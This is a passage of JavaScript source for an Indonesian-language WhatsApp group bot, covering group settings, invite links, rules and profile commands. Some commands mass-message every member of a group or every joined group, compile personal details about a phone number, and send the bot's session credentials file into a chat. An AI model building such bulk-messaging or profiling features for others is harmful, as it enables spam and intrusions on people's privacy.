if (!isBotAdmins) return reply(mess.botAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply(`Mᴀᴜ ʙᴜᴋᴀ ᴏᴛᴏᴍᴀᴛɪs ?
*⫹⫺ Cᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} 12 Jᴀᴍ*

╔═══════⟨ *Iɴғᴏ Wᴀᴋᴛᴜ* ⟩═══════❑
╠❑ *Dᴇᴛɪᴋ* = 1-60 Dᴇᴛɪᴋ
╠❑ *Mᴇɴɪᴛ* = 1-60 Mᴇɴɪᴛ
╠❑ *Jᴀᴍ* = 1-24 Jᴀᴍ
╠❑ *Hᴀʀɪ* = Bᴇʙᴀs
╚══════════════════════❑

❑ *Pᴇɴɢɢᴜɴᴀᴀɴ ʙᴇʀʟᴀᴋᴜ ᴜɴᴛᴜᴋ Aᴅᴍɪɴ ᴅᴀɴ ᴛɪᴅᴀᴋ ʙᴇʀʟᴀᴋᴜ ᴜɴᴛᴜᴋ Mᴇᴍʙᴇʀ !!!!*`)
}
reply(`*Pᴇɴᴇʀᴀᴘᴀɴ ᴡᴀᴋᴛᴜ ʙᴜᴋᴀ ᴏᴛᴏᴍᴀᴛɪs sᴜᴅᴀʜ ᴅɪ ᴛᴇʀᴀᴘᴋᴀɴ !!!*

╔☞ ɢʀᴜᴘ ᴀᴋᴀɴ ᴅɪ ʙᴜᴋᴀ ᴏᴛᴏᴍᴀᴛɪs :
╠══════════════════❑
╠❑ *ᴡᴀᴋᴛᴜ ᴏᴛᴏᴍᴀᴛɪs* : ${q}
╚══════════════════❑`)
setTimeout(() => {
var nomor = m.participant
const open = `         ⫹⫺ *Oᴛᴏᴍᴀᴛɪs Bᴜᴋᴀ* ⫹⫺

❑ _Gʀᴜᴘ ʙᴇʀʜᴀsɪʟ ᴅɪ ʙᴜᴋᴀ ᴏʟᴇʜ ʙᴏᴛ. Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴏᴛᴏᴍᴀᴛɪs ʙᴜᴋᴀ ʙᴇᴋᴇʀᴊᴀ ᴅᴇɴɢᴀɴ sᴇɴᴅɪʀɪɴʏᴀ. Sᴇᴍᴀɴɢᴀᴛ_ ^~^`
tganz.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break
            case 'group':
            case 'gc':
            case 'g':
            case 'grup': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (args[0] === 'tutup'){
                    await tganz.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`*Sukses, Mᴜʟᴀɪ sᴇᴋᴀʀᴀɴɢ ʜᴀɴʏᴀ Aᴅᴍɪɴ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`)).catch((err) => reply(mess.error))
                } else if (args[0] === 'buka'){
                    await tganz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`*Sᴜᴋsᴇs, Mᴜʟᴀɪ sᴇᴋᴀʀᴀɴɢ sᴇᴍᴜᴀ ᴍᴇᴍʙᴇʀ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`)).catch((err) => reply(mess.error))
                } else if (args[0] === 'close'){
                    await tganz.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`*Sukses, Mᴜʟᴀɪ sᴇᴋᴀʀᴀɴɢ ʜᴀɴʏᴀ Aᴅᴍɪɴ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`)).catch((err) => reply(mess.error))
                } else if (args[0] === 'open'){
                    await tganz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`*Sᴜᴋsᴇs, Mᴜʟᴀɪ sᴇᴋᴀʀᴀɴɢ sᴇᴍᴜᴀ ᴍᴇᴍʙᴇʀ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`)).catch((err) => reply(mess.error))
                } else {
                let buttons = [
                        { buttonId: '.group buka', buttonText: { displayText: '⚔️ Bᴜᴋᴀ' }, type: 1 },
                        { buttonId: '.group tutup', buttonText: { displayText: 'Tᴜᴛᴜᴘ 🛡️' }, type: 1 }
                    ]
                    await tganz.sendButtonText(m.chat, buttons, `*⫹⫺ Pɪʟɪʜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ʙᴜᴋᴀ ᴀᴛᴀᴜ ᴛᴜᴛᴜᴘ ɢʀᴜᴘ !*`, footer_text, m)

             }
            }
            break
            case 'sessionbot':
            case 'sessionsbot':
            case 'sesibot':
            case 'ambilsession':
            case 'ambilsessions':
            case 'ambilsesi': {
         if (isBan) return reply(mess.ban)
         if (!isCreator) return reply(mess.owner)
            m.reply('🗣️ *Tᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ, ʙᴏᴛ sᴇᴅᴀɴɢ ᴍᴇɴɢᴀᴍʙɪʟ ʙᴇʀᴋᴀs ғɪʟᴇ sᴇssɪᴏɴs ʙᴏᴛ ɪɴɪ !!!*')
            let sesi = await fs.readFileSync('./@T-Runner°2023/creds.json')
            tganz.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: '❏ Sesi-Botz.json' }, { quoted: m })
       }
          break
            case 'pushmem':
            case 'pushmember':
            case 'jpm': {
         if (isBan) return reply(mess.ban)
         if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*⫹⫺ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix}${command} Hᴀɪ Gᴜʏs*`)
let getGroups = await tganz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let piw = groups.map(v => v.id)
reply(`🗣️ Mᴏʜᴏɴ ʙᴇʀsᴀʙᴀʀ ʙᴏᴛ sᴇᴅᴀɴɢ ᴘᴜsʜ ᴍᴇᴍʙᴇʀ ᴅᴀʀɪ ɢʀᴜᴘ ʏᴀɴɢ ᴋᴀᴍᴜ ᴘᴜɴʏᴀ sᴇʙᴀɴʏᴀᴋ : ( *${piw.length}* ) Gʀᴜᴘ !!!`)
for (let i of piw) {
await sleep(2000)
let txt = `\n${text}\n`
tganz.sendMessage(i, {text: txt})
}
reply(`🗣️ *Hᴀɪ ᴏᴡɴᴇʀ, Pᴜsʜ ᴍᴇᴍʙᴇʀ sᴜᴅᴀʜ sᴇʟᴇsᴀɪ ᴅɪ ᴊᴀʟᴀɴᴋᴀɴ ᴅᴀɴ ʙᴇʙᴇʀᴀᴘᴀ ɢʀᴜᴘ ʏᴀɴɢ sᴜᴅᴀʜ ᴋᴀᴍᴜ ᴊᴏɪɴ ᴛᴇʟᴀʜ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴇᴋs/ᴘᴇsᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴋᴀᴍᴜ ʙᴜᴀᴛ sᴇʙᴇʟᴜᴍɴʏᴀ !!!*`)
}
break
            case "cekmem": 
            case "cekmember": {
       if (isBan) return reply(mess.ban)
       if (!isCreator) return reply(mess.owner)
if (!q) return reply("Mᴀsᴜᴋᴀɴ ID Gʀᴜᴘɴʏᴀ ʏᴀ ᴋᴀᴋ !!!\n\n❏ *ᴘᴇɴɢᴀᴍʙɪʟᴀɴ ɪᴅ ɢʀᴜᴘ ʙɪsᴀ ᴍᴇʟᴀʟᴜɪ #ᴄᴇᴋɪᴅ ᴀᴛᴀᴜ #ʟɪsᴛɢᴄ !!!*")
let cekmd = await tganz.groupMetadata(q)
let txrk = await tganz.sendMessage(from, { text: `    ⌈ *Iɴғᴏ - Gʀᴜᴘ* ⌋\n\n❏ *Nᴀᴍᴀ Gʀᴜᴘ :* ${cekmd.subject}\n❏ *Jᴜᴍʟᴀʜ Mᴇᴍʙᴇʀ :* ⟨ ${cekmd.participants.length} ⟩ Mᴇᴍʙᴇʀ\n` }, { quoted: m })
          }
            break
            case "pushviaid":
            case "pushid":
            case "pushgrupid":
            case "pushkontakid":
            case "pushgrupid":
            case "pushkontakviaid": {
            if (isBan) return reply(mess.ban)
          if (!isCreator) return reply(mess.owner)
        if (!q) return reply(`*⫹⫺ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} ID-Gʀᴜᴘ|Pᴇsᴀɴ*\n❑ Pᴇɴɢᴀᴍʙɪʟᴀɴ ID-Gʀᴜᴘ ʙɪsᴀ ᴅɪ ᴀᴍʙɪʟ ʟᴇᴡᴀᴛ ⟨ *ʟɪsᴛɢᴄ* ⟩ !!!`)
          m.reply('_Sᴇᴅᴀɴɢ ᴘᴜsʜ ᴋᴏɴᴛᴀᴋ..._')
          const metadata2 = await tganz.groupMetadata(q.split("|")[0])
          const halss = metadata2.participants
         for (let sender of halss) {
       tganz.sendMessage(`${sender.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
          await sleep(1000)
   }
   sticSukses(from)
}
break
            case "pushcontact" :
            case "pushkontak" : {
            if (isBan) return reply(mess.ban)
          if (!m.isGroup) return reply(mess.group)
          if (!isCreator) return reply(mess.owner)
          if (!text) return m.reply(`*⫹⫺ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix}${command} Hᴀɪ Gᴜʏs*`)
          let get = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
          let count = get.length
          let sentCount = 0
          m.reply('_Sᴇᴅᴀɴɢ ᴘᴜsʜ ᴋᴏɴᴛᴀᴋ..._')
          for (let i = 0; i < get.length; i++) {
            setTimeout(function() {
              tganz.sendMessage(get[i], { text: text })
              count--
              sentCount++
              if (count === 0) {
                m.reply(`Bᴇʀʜᴀsɪʟ ᴘᴜsʜ ᴋᴏɴᴛᴀᴋ !!!!\n\n⊙════════════════════⊙\n❑ Jᴜᴍʟᴀʜ ᴍᴇᴍʙᴇʀ ʏᴀɴɢ ᴍᴇɴᴇʀɪᴍᴀ ᴘᴜsʜ ᴋᴏɴᴛᴀᴋ :\n*☞ ${sentCount} Mᴇᴍʙᴇʀ*\n⊙════════════════════⊙\n☫ ᴘᴜsʜ ʙʏ ᴛᴇsᴛɢᴀɴᴢ ☫`)
              }
            }, i * 1000) // delay setiap pengiriman selama 1 detik
          }
          sticSukses(from)
        }
        break
        case 'setname': 
        case 'setnama':
        case 'setnamagc':
        case 'setsubject': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (!text) return reply(`*Hᴀɪ ᴋᴀᴋ, ᴍᴀᴜ ɢᴀɴᴛɪ ɴᴀᴍᴀ ɢʀᴜᴘ ? ʙᴇʀɪᴋᴀɴ ᴛᴇᴋsɴʏᴀ ʏᴀ ᴋᴀᴋ !!!*`)
                await tganz.groupUpdateSubject(m.chat, text).then((res) => m.reply(`Sᴜᴋsᴇs ɴᴀᴍᴀ ɢʀᴜᴘ ᴛᴇʟᴀʜ ᴅɪ ɢᴀɴᴛɪ ᴏʟᴇʜ ᴀᴅᴍɪɴ : ⟨ *${pushname}* ⟩\n\n❑ ɴᴀᴍᴀ ɢʀᴜᴘ ᴅɪ ᴜʙᴀʜ ᴍᴇɴᴊᴀᴅɪ :\n╔═════════════════❑
╠☞ *${text}*
╚═════════════════❑\n`)).catch((err) => m.reply(mess.error))
            }
            break
          case 'editinfogc': 
          case 'infoedit': 
          case 'editinfo': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (args[0] === 'open') {
                    await tganz.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Iɴғᴏ ɢʀᴜᴘ ᴛᴇʟᴀʜ ᴅɪ ʙᴇʙᴀsᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ : ⟨ *${puhsname}* ⟩\n\n❑ ɪɴғᴏ ɢʀᴜᴘ ᴛᴇʟᴀʜ ᴅɪ ʙᴇʙᴀsᴋᴀɴ sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴍᴇᴍʙᴇʀ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴜʙᴀʜ ᴅᴀɴ ᴍᴇɴɢᴇᴅɪᴛ ɴᴀᴍᴀ sᴇʀᴛᴀ ᴅᴇsᴋʀɪᴘsɪ ɢʀᴜᴘ ɪɴɪ !!!`)).catch((err) => m.reply(mess.error))
                } else if (args[0] === 'close') {
                    await tganz.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Iɴғᴏ ɢʀᴜᴘ ᴛᴇʟᴀʜ ᴅɪ ʙᴀᴛᴀsɪ ᴏʟᴇʜ ᴀᴅᴍɪɴ : ⟨ *${puhsname}* ⟩\n\n❑ ɪɴғᴏ ɢʀᴜᴘ ᴛᴇʟᴀʜ ᴅɪ ʙᴀᴛᴀsɪ sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴍᴇᴍʙᴇʀ ᴛɪᴅᴀᴋ ʟᴀɢɪ ᴅɪ ᴘᴇʀʙᴏʟᴇʜᴋᴀɴ ᴇᴅɪᴛ ɴᴀᴍᴀ sᴇʀᴛᴀ ᴅᴇsᴋʀɪᴘsɪ ɢʀᴜᴘ ɪɴɪ ʟᴀɢɪ !!!`)).catch((err) => m.reply(mess.error))
                } else {
                    m.reply(`*❑ Uɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ sɪʟᴀʜᴋᴀɴ ᴋᴇᴛɪᴋ : ${prefix + command} ᴏɴ/ᴏғғ*\n\n❑ *ᴍᴏᴅᴇ - ᴏɴ* = ᴍᴇᴍʙᴇʀ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴜʙᴀʜ ᴅᴀɴ ᴍᴇɴɢᴇᴅɪᴛ ɴᴀᴍᴀ sᴇʀᴛᴀ ᴅᴇsᴋʀɪᴘsɪ ɢʀᴜᴘ ɪɴɪ !!!\n❑ *ᴍᴏᴅᴇ - ᴏғғ* = ᴍᴇᴍʙᴇʀ ᴛɪᴅᴀᴋ ᴅɪ ᴘᴇʀʙᴏʟᴇʜᴋᴀɴ ᴇᴅɪᴛ ᴀᴛᴀᴜ ᴜʙᴀʜ ɴᴀᴍᴀ sᴇʀᴛᴀ ᴅᴇsᴋʀɪᴘsɪ ɢʀᴜᴘ ɪɴɪ !!!`)
                }
            }
            break
          case 'setdesc': 
          case 'setdeskripsi':
          case 'setdesk': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (!text) return reply(`*Hᴀɪ ᴋᴀᴋ, ᴍᴀᴜ ɢᴀɴᴛɪ ᴅᴇsᴋʀɪᴘsɪ ɢʀᴜᴘ ? ʙᴇʀɪᴋᴀɴ ᴛᴇᴋsɴʏᴀ ʏᴀ ᴋᴀᴋ !!!*`)
                await tganz.groupUpdateDescription(m.chat, text).then((res) => m.reply(`Sᴜᴋsᴇs ᴅᴇsᴋʀɪᴘsɪ ɢʀᴜᴘ ᴛᴇʟᴀʜ ᴅɪ ɢᴀɴᴛɪ ᴏʟᴇʜ ᴀᴅᴍɪɴ : ⟨ *${pushname}* ⟩\n\n❑ ᴅᴇsᴋʀɪᴘsɪ ɢʀᴜᴘ ᴅɪ ᴜʙᴀʜ ᴍᴇɴᴊᴀᴅɪ :\n\n${text}\n`)).catch((err) => m.reply(mess.error))
            }
            break
          case 'setpbot':
          case 'setppbot': {
            if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                if (!/image/.test(mime)) return reply (`*Hᴀɪ ᴋᴀᴋ, ᴍᴀᴜ ɢᴀɴᴛɪ ғᴏᴛᴏ ᴘʀᴏғɪʟ ʙᴏᴛ ?  ᴋɪʀɪᴍ/ʙᴀʟᴀs ɢᴀᴍʙᴀʀ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ : ${prefix + command}*`)
                if (/webp/.test(mime)) return reply (`*Hᴀɪ ᴋᴀᴋ, ᴍᴀᴜ ɢᴀɴᴛɪ ғᴏᴛᴏ ᴘʀᴏғɪʟ ʙᴏᴛ ?  ᴋɪʀɪᴍ/ʙᴀʟᴀs ɢᴀᴍʙᴀʀ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ : ${prefix + command}*`)
                let media = await tganz.downloadAndSaveMediaMessage(qmsg)
                await tganz.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                sticSukses(from)
                }
                break
           case 'setppgroup': 
           case 'setppgrup': 
           case 'setpgc':
           case 'setppgc': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (!/image/.test(mime)) return reply (`*Hᴀɪ ᴋᴀᴋ, ᴍᴀᴜ ɢᴀɴᴛɪ ғᴏᴛᴏ ᴘʀᴏғɪʟ ɢʀᴜᴘ ?  ᴋɪʀɪᴍ/ʙᴀʟᴀs ɢᴀᴍʙᴀʀ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ : ${prefix + command}*`)
                if (/webp/.test(mime)) return reply (`*Hᴀɪ ᴋᴀᴋ, ᴍᴀᴜ ɢᴀɴᴛɪ ғᴏᴛᴏ ᴘʀᴏғɪʟ ɢʀᴜᴘ ?  ᴋɪʀɪᴍ/ʙᴀʟᴀs ɢᴀᴍʙᴀʀ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ : ${prefix + command}*`)
                let media = await tganz.downloadAndSaveMediaMessage(qmsg)
                await tganz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(`Sᴜᴋsᴇs ғᴏᴛᴏ ᴘʀᴏғɪʟ ɢʀᴜᴘ ᴛᴇʟᴀʜ ᴅɪ ɢᴀɴᴛɪ ᴏʟᴇʜ ᴀᴅᴍɪɴ : ⟨ *${pushname}* ⟩`)
                }
                break
            case 'stalkerwa':
            case 'stalkerwhatsapp':
            case 'stalkwhatsapp':
            case 'stalkwa': {
            if (isBan) return reply(mess.ban)
            if (!text) return reply(`@Tᴀɢ/Nᴏᴍᴏʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*⫹⫺ Cᴏɴᴛᴏʜ : ${prefix + command} @Tᴀɢ/62xxxx*`)
            if (!quoted) throw text
            let regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
            let num = m.quoted?.sender || m.mentionedJid?.[0] || text
	num = num.replace(/\D/g, '') + '@s.whatsapp.net'
	if (!(await tganz.onWhatsApp(num))[0]?.exists) return reply('Nᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴛᴇʀᴅᴀғᴛᴀʀ ᴅɪ WʜᴀᴛsAᴘᴘ !!!')
	let img = await tganz.profilePictureUrl(num, 'image').catch(_ => './src/avatar_contact.png')
	let bio = await tganz.fetchStatus(num).catch(_ => { })
	let name = await tganz.getName(num)
	let business = await tganz.getBusinessProfile(num)
	let format = PhoneNum(`+${num.split('@')[0]}`)
	let country = regionNames.of(format.getRegionCode('international'))
	let wea = `*⫹⫺ STALKER - WHATSAPP ⫹⫺*\n\n*❑ Nᴇɢᴀʀᴀ Asᴀʟ :* ${country.toUpperCase()}\n*❑ Nᴀᴍᴀ Pᴇᴍɪʟɪᴋ Aᴋᴜɴ :* ${name ? name : '-'}\n*❑ Nᴏᴍᴏʀ Tᴇʟᴇᴘᴏɴ :* ${format.getNumber('international')}\n*❑ Lɪɴᴋ Kᴏɴᴛᴀᴋ :* wa.me/${num.split('@')[0]}\n*❑ Tᴀɢ Dᴀʟᴀᴍ Gʀᴜᴘ :* @${num.split('@')[0]}\n*❑ Iɴғᴏ Sᴛᴀᴛᴜs :* ${bio?.status || '-'}\n*❑ Pᴇᴍʙᴀʀᴜᴀɴ Iɴғᴏ Sᴛᴀᴛᴜs :* ${bio?.setAt ? moment(bio.setAt.toDateString()).locale('id').format('LL') : '-'}\n\n${business ? `\t\t\t\t*▾ INFO BUSINESS ▾*\n\n*° BusinessId :* ${business.wid}\n*❑ Wᴇʙsɪᴛᴇ Bɪsɴɪs :* ${business.website ? business.website : '-'}\n*❑ Eᴍᴀɪʟ Bɪsɴɪs :* ${business.email ? business.email : '-'}\n*❑ Kᴀᴛᴇɢᴏʀɪ Bɪsɴɪs :* ${business.category}\n*❑ Aʟᴀᴍᴀᴛ Nᴏᴍᴏʀ Iɴɪ :* ${business.address ? business.address : '-'}\n*❑ Jᴀᴍ :* ${business.business_hours.timezone ? business.business_hours.timezone : '-'}\n*❑ Dᴇsᴋʀɪᴘsɪ Bɪsɴɪs :* ${business.description ? business.description : '-'}` : '*© Bʏ TᴇsᴛGᴀɴᴢ*'}`
	img ? await tganz.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: m }) : m.reply(wea)
}
  break
       case 'rules': {
       if (isBan) return reply(mess.ban)
         m.reply (`  ⌈ *𝙍 𝙐 𝙇 𝙀 𝙎* ⌋
         
     ◈ 𝐑𝐮𝐥𝐞𝐬/𝐏𝐞𝐫𝐚𝐭𝐮𝐫𝐚𝐧 𝐝𝐚𝐥𝐚𝐦 𝐦𝐞𝐧𝐠𝐠𝐮𝐧𝐚𝐤𝐚𝐧 𝐛𝐨𝐭 𝐢𝐧𝐢 ◈
⊙═══════════════════════⊙
❑ 𝑱𝒂𝒏𝒈𝒂𝒏 𝒔𝒑𝒂𝒎 𝒅𝒂𝒍𝒂𝒎 𝒎𝒆𝒏𝒈𝒈𝒖𝒏𝒂𝒌𝒂𝒏 𝒃𝒐𝒕 !
❑ 𝑻𝒊𝒅𝒂𝒌 𝒎𝒆𝒎𝒂𝒌𝒔𝒂 𝒃𝒐𝒕 𝒖𝒏𝒕𝒖𝒌 𝒅𝒊 𝒖𝒏𝒅𝒂𝒏𝒈 𝒌𝒆 𝒅𝒂𝒍𝒂𝒎 𝒈𝒓𝒖𝒑 𝒎𝒖 !
❑ 𝑩𝒆𝒓𝒊 𝒋𝒆𝒅𝒂 3 𝒅𝒆𝒕𝒊𝒌 𝒅𝒂𝒍𝒂𝒎 𝒎𝒆𝒏𝒈𝒈𝒖𝒏𝒂𝒌𝒂𝒏 𝒇𝒊𝒕𝒖𝒓 𝒃𝒐𝒕 𝒂𝒈𝒂𝒓 𝒕𝒊𝒅𝒂𝒌 𝒅𝒆𝒍𝒂𝒚 !
❑ 𝑱𝒂𝒏𝒈𝒂𝒏 𝒎𝒆𝒏𝒈𝒆𝒋𝒆𝒌 𝒐𝒘𝒏𝒆𝒓 𝒌𝒂𝒓𝒆𝒏𝒂 𝒐𝒘𝒏𝒆𝒓 𝒚𝒂𝒏𝒈 𝒕𝒆𝒍𝒂𝒉 𝒎𝒆𝒏𝒋𝒂𝒍𝒂𝒏𝒌𝒂𝒏 𝒃𝒐𝒕 𝒊𝒏𝒊 !
❑ 𝑱𝒂𝒏𝒈𝒂𝒏 𝒌𝒊𝒓𝒊𝒎 𝒗𝒊𝒓𝒕𝒆𝒙 𝒌𝒆 𝒃𝒐𝒕 𝒌𝒂𝒓𝒆𝒏𝒂 𝒃𝒊𝒔𝒂 𝒎𝒆𝒎𝒃𝒖𝒂𝒕 𝒃𝒐𝒕 𝒔𝒕𝒖𝒄𝒌/𝒆𝒓𝒓𝒐𝒓 !
❑ 𝑱𝒂𝒏𝒈𝒂𝒏 𝒕𝒆𝒓𝒍𝒂𝒍𝒖 𝒎𝒆𝒏𝒈𝒈𝒖𝒏𝒂𝒌𝒂𝒏 𝒇𝒊𝒕𝒖𝒓 𝒚𝒂𝒏𝒈 𝒕𝒊𝒅𝒂𝒌 𝒅𝒊 𝒊𝒛𝒊𝒏𝒌𝒂𝒏 𝒌𝒂𝒓𝒆𝒏𝒂 𝒃𝒊𝒔𝒂 𝒎𝒆𝒎𝒃𝒖𝒂𝒕 𝒌𝒂𝒎𝒖 𝒕𝒆𝒓𝒃𝒂𝒏𝒏𝒆𝒅 𝒅𝒊 𝒃𝒐𝒕 𝒊𝒏𝒊 !
❑ 𝑻𝒊𝒅𝒂𝒌 𝒍𝒖𝒑𝒂 𝒃𝒆𝒓𝒕𝒆𝒓𝒊𝒎𝒂𝒌𝒂𝒔𝒊𝒉 𝒌𝒆𝒑𝒂𝒅𝒂 𝒃𝒐𝒕 𝒋𝒊𝒌𝒂 𝒃𝒐𝒕 𝒎𝒆𝒎𝒃𝒂𝒏𝒕𝒖𝒎𝒖 𝒅𝒂𝒍𝒂𝒎 𝒉𝒂𝒍 𝒚𝒂𝒏𝒈 𝒎𝒆𝒏𝒖𝒓𝒖𝒕𝒎𝒖 𝒃𝒆𝒓𝒈𝒖𝒏𝒂 𝒅𝒊 𝒃𝒐𝒕 𝒊𝒏𝒊 !
⊙═══════════════════════⊙

⫹⫺ ᴘᴇɴɢɢᴜɴᴀ ʏᴀɴɢ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ᴅɪ ᴀᴛᴀs ᴀᴋᴀɴ ᴅɪ ʙᴇʀɪᴋᴀɴ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ʙᴀɴɴᴇᴅ ᴘᴇʀᴍᴀɴᴇɴ !!!

*⌘ ᴛʀɪᴍᴀᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇᴍʙᴀᴄᴀ ʀᴜʟᴇs ʙᴏᴛ ɪɴɪ ⌘*`)
      }
       break
            case 'linkgroup': 
            case 'linggc':
            case 'link':
            case 'lingc':
            case 'linkgc': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let response = await tganz.groupInviteCode(m.chat)
                tganz.sendText(m.chat, `*۞ Iɴғᴏʀᴍᴀsɪ Gʀᴜᴘ ۞*\n\n⊙══════════════════════⊙\n⌂ Nᴀᴍᴀ Gʀᴜᴘ : ${groupMetadata.subject}\n❑ Lɪɴᴋ Gʀᴜᴘ :\nhttps://chat.whatsapp.com/${response}\n⊙══════════════════════⊙`, m, { detectLink: true })
            }
            break
            case 'groupbot':
            case 'gcbot':
            case 'grupbot':
            case 'linkgcbot': {
            if (isBan) return reply(mess.ban)
            m.reply(` *◈ Gʀᴏᴜᴘ Bᴏᴛ TᴇsᴛGᴀɴᴢ ◈*
                
⊙══════════════════════⊙
*❑ Lɪɴᴋ Gʀᴏᴜᴘ :* https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz
⊙══════════════════════⊙
*✧҉ ɪ҉ ɴ҉ ғ҉ ᴏ҉  ɢ҉ ʀ҉ ᴜ҉ ᴘ҉ ✧҉ *
◉ Gʀᴜᴘ ɪɴɪ ʙᴇʀᴛᴜᴊᴜᴀɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢʜɪʙᴜʀ sᴇsᴇᴏʀᴀɴɢ/ᴍᴇᴍʙᴇʀ ɢʀᴜᴘ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴍᴀɪɴ ʙᴇʀsᴀᴍᴀ BOT ʏᴀɴɢ ᴀᴅᴀ ᴘᴀᴅᴀ ɢʀᴜᴘ ᴛᴇʀsᴇʙᴜᴛ.
◉ Mᴀʀɪ ʙᴇʀɢᴀʙᴜɴɢ ᴜɴᴛᴜᴋ ᴍᴇɴɪᴋᴍᴀᴛɪ ᴀsɪᴋɴʏᴀ ʙᴇʀᴍᴀɪɴ ʙᴇʀsᴀᴍᴀ BOT WʜᴀᴛsAᴘᴘ.
◉ Bᴇʙᴀs ʙɪᴄᴀʀᴀ, ᴛᴀɴᴘᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ ʏᴀɴɢ ᴋᴇᴛᴀᴛ.
◉ BOT 24 ᴊᴀᴍ sᴇʟᴀʟᴜ ᴏɴʟɪɴᴇ, Oғғ ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴛᴇᴋɴɪs ᴅᴀʟᴀᴍ ʙᴏᴛ.
◉ Sᴜᴘᴘᴏʀᴛ AI ✓
◉ Aɴᴛɪ Dᴇʟᴀʏ - ʀᴜɴ ᴡɪᴛʜ ᴘᴀɴᴇʟ ✓
◉ Gʀᴜᴘ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴛᴜᴛᴜᴘ "ᴋᴇᴄᴜᴀʟɪ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴛᴇʀᴋᴀɪᴛ BOT"
⊙══════════════════════⊙
*❁ ᴘᴇɴɢɢᴜɴᴀᴀɴ ʙᴏᴛ ᴅᴀʟᴀᴍ ɢʀᴜᴘ ❁*
